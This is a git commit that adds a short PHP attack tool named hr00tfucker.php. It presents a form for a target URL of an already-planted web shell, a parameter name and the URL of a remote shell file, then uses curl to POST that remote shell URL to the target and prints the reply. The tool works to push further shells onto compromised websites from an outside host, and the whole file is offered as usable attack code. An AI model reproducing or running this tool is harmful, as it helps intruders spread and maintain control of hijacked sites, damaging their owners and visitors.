82ca51be7eeaf1fcb1284f09b72475aa0b520503
UnderFamily <55359676+underfamily@users.noreply.github.com>
2019-09-22 14:17:22 +0300

    Create hr00tfucker.php

---
+++ hr00tfucker.php
@@ -0,0 +1,31 @@
+<center>
+<form action="" method="REQUEST">
+<input type="text" name="site">(ex:http://site.com/shell.php)
+<br>
+<input type="text" name="acik" value="lisances">(ex:bs - 404)
+<br>
+<input type="text" name="shellurl">(ex:http://site.com/youshell.txt)
+<br>
+<button type="submit" name="r00tfucker">r00t fucker</button>
+</form>
+<?php
+if(isset($_REQUEST["r00tfucker"])) {
+$s = $_REQUEST["site"];
+$sh = $_REQUEST["shellurl"];
+$m = $_REQUEST["acik"];
+error_reporting(E_ALL);
+$ch = curl_init($s);
+curl_setopt ($ch, CURLOPT_POST, true);
+curl_setopt ($ch, CURLOPT_POSTFIELDS, "".$m."=".$sh."");
+
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_VERBOSE, 1);
+curl_setopt($ch, CURLOPT_NOBODY, 0);
+
+$r00tfuck = curl_exec($ch);
+
+echo $r00tfuck;
+
+curl_close($ch);
+}
+?>
